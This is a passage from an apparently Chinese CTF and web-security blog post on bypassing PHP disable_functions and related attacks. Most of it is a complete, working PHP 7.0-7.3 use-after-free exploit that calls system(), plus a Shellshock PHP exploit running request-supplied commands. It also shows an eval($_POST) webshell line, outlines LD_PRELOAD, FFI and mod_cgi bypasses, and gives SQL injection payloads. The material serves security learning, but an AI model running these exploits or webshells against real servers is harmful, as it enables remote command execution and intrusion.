class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># PHP 7.0-7.3 disable_functions bypass PoC (*nix only)</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># <span class="doctag">Bug:</span> https://bugs.php.net/bug.php?id=72530</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># This exploit should work on all PHP 7.0-7.3 versions</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Author: https://github.com/mm0r1</span></span><br><span class="line"></span><br><span class="line">pwn(<span class="string">&quot;uname -a&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">pwn</span>(<span class="params">$cmd</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">global</span> $abc, $helper;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">str2ptr</span>(<span class="params">&amp;$str, $p = <span class="number">0</span>, $s = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        $address = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>($j = $s<span class="number">-1</span>; $j &gt;= <span class="number">0</span>; $j--) &#123;</span><br><span class="line">            $address &lt;&lt;= <span class="number">8</span>;</span><br><span class="line">            $address |= ord($str[$p+$j]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> $address;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">ptr2str</span>(<span class="params">$ptr, $m = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        $out = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">for</span> ($i=<span class="number">0</span>; $i &lt; $m; $i++) &#123;</span><br><span class="line">            $out .= chr($ptr &amp; <span class="number">0xff</span>);</span><br><span class="line">            $ptr &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> $out;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params">&amp;$str, $p, $v, $n = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        $i = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; $n; $i++) &#123;</span><br><span class="line">            $str[$p + $i] = chr($v &amp; <span class="number">0xff</span>);</span><br><span class="line">            $v &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">leak</span>(<span class="params">$addr, $p = <span class="number">0</span>, $s = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> $abc, $helper;</span><br><span class="line">        write($abc, <span class="number">0x68</span>, $addr + $p - <span class="number">0x10</span>);</span><br><span class="line">        $leak = strlen($helper-&gt;a);</span><br><span class="line">        <span class="keyword">if</span>($s != <span class="number">8</span>) &#123; $leak %= <span class="number">2</span> &lt;&lt; ($s * <span class="number">8</span>) - <span class="number">1</span>; &#125;</span><br><span class="line">        <span class="keyword">return</span> $leak;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">parse_elf</span>(<span class="params">$base</span>) </span>&#123;</span><br><span class="line">        $e_type = leak($base, <span class="number">0x10</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        $e_phoff = leak($base, <span class="number">0x20</span>);</span><br><span class="line">        $e_phentsize = leak($base, <span class="number">0x36</span>, <span class="number">2</span>);</span><br><span class="line">        $e_phnum = leak($base, <span class="number">0x38</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; $e_phnum; $i++) &#123;</span><br><span class="line">            $header = $base + $e_phoff + $i * $e_phentsize;</span><br><span class="line">            $p_type  = leak($header, <span class="number">0</span>, <span class="number">4</span>);</span><br><span class="line">            $p_flags = leak($header, <span class="number">4</span>, <span class="number">4</span>);</span><br><span class="line">            $p_vaddr = leak($header, <span class="number">0x10</span>);</span><br><span class="line">            $p_memsz = leak($header, <span class="number">0x28</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>($p_type == <span class="number">1</span> &amp;&amp; $p_flags == <span class="number">6</span>) &#123; <span class="comment"># PT_LOAD, PF_Read_Write</span></span><br><span class="line">                <span class="comment"># handle pie</span></span><br><span class="line">                $data_addr = $e_type == <span class="number">2</span> ? $p_vaddr : $base + $p_vaddr;</span><br><span class="line">                $data_size = $p_memsz;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span>($p_type == <span class="number">1</span> &amp;&amp; $p_flags == <span class="number">5</span>) &#123; <span class="comment"># PT_LOAD, PF_Read_exec</span></span><br><span class="line">                $text_size = $p_memsz;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!$data_addr || !$text_size || !$data_size)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> [$data_addr, $text_size, $data_size];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_basic_funcs</span>(<span class="params">$base, $elf</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">list</span>($data_addr, $text_size, $data_size) = $elf;</span><br><span class="line">        <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; $data_size / <span class="number">8</span>; $i++) &#123;</span><br><span class="line">            $leak = leak($data_addr, $i * <span class="number">8</span>);</span><br><span class="line">            <span class="keyword">if</span>($leak - $base &gt; <span class="number">0</span> &amp;&amp; $leak - $base &lt; $data_addr - $base) &#123;</span><br><span class="line">                $deref = leak($leak);</span><br><span class="line">                <span class="comment"># &#x27;constant&#x27; constant check</span></span><br><span class="line">                <span class="keyword">if</span>($deref != <span class="number">0x746e6174736e6f63</span>)</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            $leak = leak($data_addr, ($i + <span class="number">4</span>) * <span class="number">8</span>);</span><br><span class="line">            <span class="keyword">if</span>($leak - $base &gt; <span class="number">0</span> &amp;&amp; $leak - $base &lt; $data_addr - $base) &#123;</span><br><span class="line">                $deref = leak($leak);</span><br><span class="line">                <span class="comment"># &#x27;bin2hex&#x27; constant check</span></span><br><span class="line">                <span class="keyword">if</span>($deref != <span class="number">0x786568326e6962</span>)</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> $data_addr + $i * <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_binary_base</span>(<span class="params">$binary_leak</span>) </span>&#123;</span><br><span class="line">        $base = <span class="number">0</span>;</span><br><span class="line">        $start = $binary_leak &amp; <span class="number">0xfffffffffffff000</span>;</span><br><span class="line">        <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; <span class="number">0x1000</span>; $i++) &#123;</span><br><span class="line">            $addr = $start - <span class="number">0x1000</span> * $i;</span><br><span class="line">            $leak = leak($addr, <span class="number">0</span>, <span class="number">7</span>);</span><br><span class="line">            <span class="keyword">if</span>($leak == <span class="number">0x10102464c457f</span>) &#123; <span class="comment"># ELF header</span></span><br><span class="line">                <span class="keyword">return</span> $addr;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_system</span>(<span class="params">$basic_funcs</span>) </span>&#123;</span><br><span class="line">        $addr = $basic_funcs;</span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            $f_entry = leak($addr);</span><br><span class="line">            $f_name = leak($f_entry, <span class="number">0</span>, <span class="number">6</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>($f_name == <span class="number">0x6d6574737973</span>) &#123; <span class="comment"># system</span></span><br><span class="line">                <span class="keyword">return</span> leak($addr + <span class="number">8</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            $addr += <span class="number">0x20</span>;</span><br><span class="line">        &#125; <span class="keyword">while</span>($f_entry != <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">ryat</span> </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> $ryat;</span><br><span class="line">        <span class="keyword">var</span> $chtg;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;chtg = <span class="keyword">$this</span>-&gt;ryat;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;ryat = <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Helper</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $a, $b, $c, $d;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(stristr(PHP_OS, <span class="string">&#x27;WIN&#x27;</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;This PoC is for *nix systems only.&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $n_alloc = <span class="number">10</span>; <span class="comment"># increase this value if you get segfaults</span></span><br><span class="line"></span><br><span class="line">    $contiguous = [];</span><br><span class="line">    <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; $n_alloc; $i++)</span><br><span class="line">        $contiguous[] = str_repeat(<span class="string">&#x27;A&#x27;</span>, <span class="number">79</span>);</span><br><span class="line"></span><br><span class="line">    $poc = <span class="string">&#x27;a:4:&#123;i:0;i:1;i:1;a:1:&#123;i:0;O:4:&quot;ryat&quot;:2:&#123;s:4:&quot;ryat&quot;;R:3;s:4:&quot;chtg&quot;;i:2;&#125;&#125;i:1;i:3;i:2;R:5;&#125;&#x27;</span>;</span><br><span class="line">    $out = unserialize($poc);</span><br><span class="line">    gc_collect_cycles();</span><br><span class="line"></span><br><span class="line">    $v = [];</span><br><span class="line">    $v[<span class="number">0</span>] = ptr2str(<span class="number">0</span>, <span class="number">79</span>);</span><br><span class="line">    <span class="keyword">unset</span>($v);</span><br><span class="line">    $abc = $out[<span class="number">2</span>][<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">    $helper = <span class="keyword">new</span> Helper;</span><br><span class="line">    $helper-&gt;b = <span class="function"><span class="keyword">function</span> (<span class="params">$x</span>) </span>&#123; &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(strlen($abc) == <span class="number">79</span> || strlen($abc) == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;UAF failed&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># leaks</span></span><br><span class="line">    $closure_handlers = str2ptr($abc, <span class="number">0</span>);</span><br><span class="line">    $php_heap = str2ptr($abc, <span class="number">0x58</span>);</span><br><span class="line">    $abc_addr = $php_heap - <span class="number">0xc8</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># fake value</span></span><br><span class="line">    write($abc, <span class="number">0x60</span>, <span class="number">2</span>);</span><br><span class="line">    write($abc, <span class="number">0x70</span>, <span class="number">6</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment"># fake reference</span></span><br><span class="line">    write($abc, <span class="number">0x10</span>, $abc_addr + <span class="number">0x60</span>);</span><br><span class="line">    write($abc, <span class="number">0x18</span>, <span class="number">0xa</span>);</span><br><span class="line"></span><br><span class="line">    $closure_obj = str2ptr($abc, <span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line">    $binary_leak = leak($closure_handlers, <span class="number">8</span>);</span><br><span class="line">    <span class="keyword">if</span>(!($base = get_binary_base($binary_leak))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t determine binary base address&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!($elf = parse_elf($base))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t parse ELF header&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!($basic_funcs = get_basic_funcs($base, $elf))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t get basic_functions address&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!($zif_system = get_system($basic_funcs))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t get zif_system address&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># fake closure object</span></span><br><span class="line">    $fake_obj_offset = <span class="number">0xd0</span>;</span><br><span class="line">    <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; <span class="number">0x110</span>; $i += <span class="number">8</span>) &#123;</span><br><span class="line">        write($abc, $fake_obj_offset + $i, leak($closure_obj, $i));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># pwn</span></span><br><span class="line">    write($abc, <span class="number">0x20</span>, $abc_addr + $fake_obj_offset);</span><br><span class="line">    write($abc, <span class="number">0xd0</span> + <span class="number">0x38</span>, <span class="number">1</span>, <span class="number">4</span>); <span class="comment"># internal func type</span></span><br><span class="line">    write($abc, <span class="number">0xd0</span> + <span class="number">0x68</span>, $zif_system); <span class="comment"># internal func handler</span></span><br><span class="line"></span><br><span class="line">    ($helper-&gt;b)($cmd);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在可以连接的情况下，将poc上传到<code>/tmp/</code> 目录下，然后包含他。</p><p>比如 GKCTF2020 Checkin ，GYCTF2020 EasyThink也是 一样的bypass思路。先是<code>Ginkgo=eval($_POST[1]);</code> 然后AS连上后，在<code>/tmp/</code>目录上上传exp。</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo/images/20200526231323.png"></p><h4 id="LD-PRELOAD-劫持"><a href="#LD-PRELOAD-劫持" class="headerlink" title="LD_PRELOAD 劫持"></a>LD_PRELOAD 劫持</h4><blockquote><p>利用环境变量 LD_PRELOAD 劫持系统函数，让外部程序加载恶意 *.so</p></blockquote><h4 id="ImageMagick-vuln-bypass"><a href="#ImageMagick-vuln-bypass" class="headerlink" title="ImageMagick vuln bypass"></a>ImageMagick vuln bypass</h4><p>也就是<strong>利用存在漏洞的组件，扩展。</strong></p><h4 id="Mod-cgi"><a href="#Mod-cgi" class="headerlink" title="Mod_cgi"></a>Mod_cgi</h4><blockquote><p>修改 .htaccess，调整请求访问路由，绕过 php.ini 中的任何限制（让特定扩展名的文件直接和php-cgi通i信</p></blockquote><h4 id="Windows-系统组件-COM"><a href="#Windows-系统组件-COM" class="headerlink" title="Windows 系统组件 COM"></a>Windows 系统组件 COM</h4><p>在<code>c:/System32/</code> 下的一个<code>wshom.ocx</code> 文件。</p><h4 id="PHP-7-4-FFI-Bypass"><a href="#PHP-7-4-FFI-Bypass" class="headerlink" title="PHP 7.4 FFI Bypass"></a>PHP 7.4 FFI Bypass</h4><blockquote><p>FFI（Foreign Function Interface），即外部函数接口，允许从用户区调用C代码。简单地说，就是一项让你在PHP里能够调用C代码的技术。</p></blockquote><p>当PHP所有的命令执行函数被禁用后，通过PHP 7.4的新特性FFI可以实现用PHP代码调用C代码的方式，先声明C中的命令执行函数，然后再通过FFI变量调用该C函数即可Bypass disable_functions。</p><p>也就是说，通过PHP调用C的命令执行函数来绕过。</p><p>需要满足：</p><ol><li><code>opcache.preload</code> 启用. (指定将在服务器启动时编译和执行的PHP文件，文件中定义的所有函数和大多数类都将永久加载到 PHP 的函数和类表中，并在将来的任何请求的上下文中永久可用)。</li><li><code>FFI support = enable</code>。</li></ol><p>例题：[RCTF 2019]Nextphp</p><p><a href="https://hack-for.fun/posts/38da.html">https://hack-for.fun/posts/38da.html</a></p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo/images/20200527134039.png"></p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo/images/20200526231206.png"></p><p><a href="https://www.php.net/manual/en/ffi.examples-basic.php">https://www.php.net/manual/en/ffi.examples-basic.php</a></p><p><a href="https://3nd.xyz/2019/11/06/Memo/bypass-disable-functions/#0x04-PHP-7-4-FFI">https://3nd.xyz/2019/11/06/Memo/bypass-disable-functions/#0x04-PHP-7-4-FFI</a></p><h4 id="Bash-ShellShock"><a href="#Bash-ShellShock" class="headerlink" title="Bash ShellShock"></a>Bash ShellShock</h4><p>利用方法的前提是目标 OS 存在 Bash破壳（CVE-2014-6271）漏洞，该漏洞的具体介绍可参考: <a href="https://www.freebuf.com/news/48331.html">破壳漏洞（CVE-2014-6271）综合分析：“破壳”漏洞系列分析之一</a></p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo/images/20200527135528.png"></p><p><strong>Bash 破壳漏洞成因</strong>：目前的 Bash 使用的环境变量是通过函数名称来调用的，导致漏洞出问题是以 <code>()&#123;</code> 开头定义的环境变量在命令 ENV 中解析成函数后，Bash 执行并未退出，而是继续解析并执行 shell 命令。而其核心的原因在于在输入的过滤中没有严格限制边界，也没有做出合法化的参数判断。</p><p>好像AntSword 虚拟终端已经将这个漏洞作为默认使用了。</p><p>EXP：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">?php </span><br><span class="line"><span class="comment"># Exploit Title: PHP 5.x Shellshock Exploit (bypass disable_functions) </span></span><br><span class="line"><span class="comment"># Google Dork: none </span></span><br><span class="line"><span class="comment"># Date: 10/31/2014 </span></span><br><span class="line"><span class="comment"># Exploit Author: Ryan King (Starfall) </span></span><br><span class="line"><span class="comment"># Vendor Homepage: http://php.net </span></span><br><span class="line"><span class="comment"># Software Link: http://php.net/get/php-5.6.2.tar.bz2/from/a/mirror </span></span><br><span class="line"><span class="comment"># Version: 5.* (tested on 5.6.2) </span></span><br><span class="line"><span class="comment"># Tested on: Debian 7 and CentOS 5 and 6 </span></span><br><span class="line"><span class="comment"># CVE: CVE-2014-6271 </span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">shellshock</span>(<span class="params">$cmd</span>) </span>&#123; <span class="comment">// Execute a command via CVE-2014-6271 @mail.c:283 </span></span><br><span class="line">   $tmp = tempnam(<span class="string">&quot;.&quot;</span>,<span class="string">&quot;data&quot;</span>); </span><br><span class="line">   putenv(<span class="string">&quot;PHP_LOL=() &#123; x; &#125;; $cmd &gt;$tmp 2&gt;&amp;1&quot;</span>); </span><br><span class="line">   <span class="comment">// In Safe Mode, the user may only alter environment variableswhose names </span></span><br><span class="line">   <span class="comment">// begin with the prefixes supplied by this directive. </span></span><br><span class="line">   <span class="comment">// By default, users will only be able to set environment variablesthat </span></span><br><span class="line">   <span class="comment">// begin with PHP_ (e.g. PHP_FOO=BAR). <span class="doctag">Note:</span> if this directive isempty, </span></span><br><span class="line">   <span class="comment">// PHP will let the user modify ANY environment variable! </span></span><br><span class="line">   mail(<span class="string">&quot;a@127.0.0.1&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="string">&quot;-bv&quot;</span>); <span class="comment">// -bv so we don&#x27;t actuallysend any mail </span></span><br><span class="line">   $output = @file_get_contents($tmp); </span><br><span class="line">   @unlink($tmp); </span><br><span class="line">   <span class="keyword">if</span>($output != <span class="string">&quot;&quot;</span>) <span class="keyword">return</span> $output; </span><br><span class="line">   <span class="keyword">else</span> <span class="keyword">return</span> <span class="string">&quot;No output, or not vuln.&quot;</span>; </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">echo</span> shellshock($_REQUEST[<span class="string">&quot;cmd&quot;</span>]); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h4 id="寻找漏网之鱼"><a href="#寻找漏网之鱼" class="headerlink" title="寻找漏网之鱼"></a>寻找漏网之鱼</h4><p>…自行领会。</p><hr><p><a href="https://github.com/l3m0n/Bypass_Disable_functions_Shell/blob/master/paper/readme.old.md">https://github.com/l3m0n/Bypass_Disable_functions_Shell/blob/master/paper/readme.old.md</a></p><p><a href="https://www.tr0y.wang/2018/04/18/PHPDisalbedfunc/index.html">https://www.tr0y.wang/2018/04/18/PHPDisalbedfunc/index.html</a></p><p><a href="https://3nd.xyz/2019/11/06/Memo/bypass-disable-functions/">https://3nd.xyz/2019/11/06/Memo/bypass-disable-functions/</a></p><p><a href="https://www.mi1k7ea.com/2019/06/02/%E6%B5%85%E8%B0%88%E5%87%A0%E7%A7%8DBypass-disable-functions%E7%9A%84%E6%96%B9%E6%B3%95/">https://www.mi1k7ea.com/2019/06/02/%E6%B5%85%E8%B0%88%E5%87%A0%E7%A7%8DBypass-disable-functions%E7%9A%84%E6%96%B9%E6%B3%95/</a></p><h2 id="XXE-PHP-7-0-30"><a href="#XXE-PHP-7-0-30" class="headerlink" title="XXE - PHP 7.0.30"></a>XXE - PHP 7.0.30</h2><ul><li>Php 7.0.30</li><li>Libxml 2.8.0</li></ul><p><strong>libxml2.9.0以后，默认不解析外部实体，导致XXE漏洞逐渐消亡。</strong></p><ul><li>SimpleXMLElement</li><li>loadXML</li><li>simplexml_load_string</li></ul><h2 id="unserialize-serialize"><a href="#unserialize-serialize" class="headerlink" title="unserialize/serialize"></a>unserialize/serialize</h2><ul><li><p>php 7.1.x～7.3.x（具体不知，php7.x 好像都可以，遇到时，试一下就可以。</p><p>对属性类型不敏感，可直接将属性改为public，减轻编写payload的负担。</p></li><li><p>php &lt; 5.6.25 &amp;&amp; php &lt; 7.0.10</p></li></ul><p><code>__wakeup</code> 可绕过。绕过方法：当对象属性个数大于真实属性个数时。</p><h2 id="SQL-Injection"><a href="#SQL-Injection" class="headerlink" title="SQL Injection"></a>SQL Injection</h2><p>不同版本的mysql 主要在”高级“ 注入情况下，</p><p><a href="https://xz.aliyun.com/t/7169#toc-3">https://xz.aliyun.com/t/7169#toc-3</a> 。 膜一波Yunen师傅。</p><h3 id="Mysql-lt-5-0-面试常问"><a href="#Mysql-lt-5-0-面试常问" class="headerlink" title="Mysql &lt; 5.0(面试常问)"></a>Mysql &lt; 5.0(面试常问)</h3><p>由于mysql的低版本缺乏系统库<strong>information_schema</strong>，故通常情况下，我们无法直接查询表名，字段(列)名等信息，这时候只能靠<strong>猜</strong>来解决。</p><p>直接猜表名与列名是什么，甚至是库名，再使用联合查询取数据。</p><p>若知道仅表名而不知道列(字段)名：</p><p>可通过以下payload：</p><ul><li>若多字段：select <code>x</code> from(select 1,2,3,4,xxx from table_name union select * from table_name)a</li><li>若单字段：select *,1,2,xxx from table_name</li></ul><h3 id="Mysql-gt-5-0（面试常问"><a href="#Mysql-gt-5-0（面试常问" class="headerlink" title="Mysql &gt;= 5.0（面试常问"></a>Mysql &gt;= 5.0（面试常问</h3><p>首先去一个名为<strong>information_schema</strong>的数据库里的<strong>shemata</strong>数据表查询<strong>全部数据库名</strong>。</p><p>若不需要跨数据库的话，可直接跳过此步骤，直接查询相应的数据库下的全部数据表名。</p><p>在information_schema的一个名为<strong>tables</strong>的数据表中存着全部的<strong>数据表信息</strong>。</p><p>其中，<strong>table_name 字段保存其名称</strong>，<strong>table_schema保存其对应的数据库名</strong>。</p><p>接着通过其表名，查询该表的所有字段名，有时也称列名。</p><p>通过information_schema库下的<strong>columns</strong>表可查询对应的数据库/数据库表含有的字段名。</p><blockquote><p>5.0以下没有information_schema这个系统表，无法列表名等，只能暴力跑表<br>名；5.0以下是多用户单操作，5.0以上是多用户多操做。</p></blockquote><h3 id="exp-pow-报错注入"><a href="#exp-pow-报错注入" class="headerlink" title="exp()/pow() 报错注入"></a>exp()/pow() 报错注入</h3><p>Mysql 5.5.5~5.5.49</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">MySQL [(none)]&gt; select exp(3);</span><br><span class="line">+--------------------+</span><br><span class="line">| exp(3)             |</span><br><span class="line">+--------------------+</span><br><span class="line">| 20.085536923187668 |</span><br><span class="line">+--------------------+</span><br><span class="line">1 row in set (0.04 sec)</span><br><span class="line"></span><br><span class="line">MySQL [(none)]&gt; select exp(999);</span><br><span class="line">ERROR 1690 (22003): DOUBLE value is out of range in &#39;exp(999)&#39;</span><br></pre></td></tr></table></figure><hr><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">MySQL [(none)]&gt; select pow(9,99);</span><br><span class="line">+-----------------------+</span><br><span class="line">| pow(9,99)             |</span><br><span class="line">+-----------------------+</span><br><span class="line">| 2.9512665430652752e94 |</span><br><span class="line">+-----------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">MySQL [(none)]&gt; select pow(9,999);</span><br><span class="line">ERROR 1690 (22003): DOUBLE value is out of range in &#39;pow(9,999)&#39;</span><br></pre></td></tr></table></figure><h3 id="updatexml-报错注入"><a href="#updatexml-报错注入" class="headerlink" title="updatexml() 报错注入"></a>updatexml() 报错注入</h3><p>Mysql 